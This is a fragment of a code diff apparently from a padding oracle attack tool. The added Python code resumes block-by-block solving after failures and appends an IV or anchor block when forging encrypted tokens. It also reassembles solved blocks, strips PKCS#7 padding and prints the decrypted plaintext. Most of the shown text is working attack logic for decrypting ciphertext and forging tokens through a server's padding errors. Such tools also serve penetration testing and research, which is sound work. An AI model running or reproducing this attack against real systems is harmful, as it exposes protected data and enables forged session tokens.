+            print(f"[!]Something went wrong with block {job.currentBlock}. Retrying ({block_failures}/{max_block_retries})")
+            if job.block_solved_intermediates:
+                print(f"[+] Resuming with {len(job.block_solved_intermediates)} bytes already solved")
 
 
     print(f"[!]All blocks completed")
@@ -1001,17 +1285,13 @@ async def async_main():
             #joinedCrypto = b''.join(list(job.solvedBlocks.values()))
             joinedCrypto = joinedCrypto[(-1 - xxx) * 16:]
 
-            # add in the "first" (last) bock of all 0's
-            joinedCrypto = b''.join([joinedCrypto,bytes([0] * job.blocksize)])
+            # Append the anchor block used as previousBlock for block 0.
+            if job.ivMode in ("knownIV", "anchorBlock"):
+                joinedCrypto = b''.join([joinedCrypto, bytes(job.iv)])
+            else:
+                joinedCrypto = b''.join([joinedCrypto, bytes([0] * job.blocksize)])
 
-        if job.encodingMode == 'base64':
-            encryptFinal = b64urlEncode(urllib.parse.quote_plus(bytes_to_base64(joinedCrypto)))
-
-        if job.encodingMode == 'base64Url':
-            encryptFinal = bytes_to_base64(joinedCrypto).decode().replace('=','').replace("+","-").replace('/','_')
-
-        if job.encodingMode == 'hex':
-            encryptFinal = joinedCrypto.hex().upper()
+        encryptFinal = job.encodeToken(joinedCrypto)
 
         print(f"[!]Encrypt final result: {encryptFinal}")
 
@@ -1021,8 +1301,20 @@ async def async_main():
     #saveState(job)
 
     if job.mode == "decrypt":
-        # No output needed, final combined result should have been printed when last block was completed
-        pass
+        combined = b''.join(job.solvedBlocks[i] for i in sorted(job.solvedBlocks.keys()))
+        # Strip PKCS#7 padding
+        pad_len = combined[-1]
+        if 1 <= pad_len <= job.blocksize and combined[-pad_len:] == bytes([pad_len]) * pad_len:
+            stripped = combined[:-pad_len]
+        else:
+            stripped = combined
+        try:
+            plaintext = stripped.decode(job.plaintextEncoding)
+        except:
+            plaintext = stripped.decode('latin1')
+        print(f"\n{'='*50}")
+        print(f"[+] Decrypted plaintext: {plaintext}")
+        print(f"{'='*50}")
 
     #job.printProgress()
 
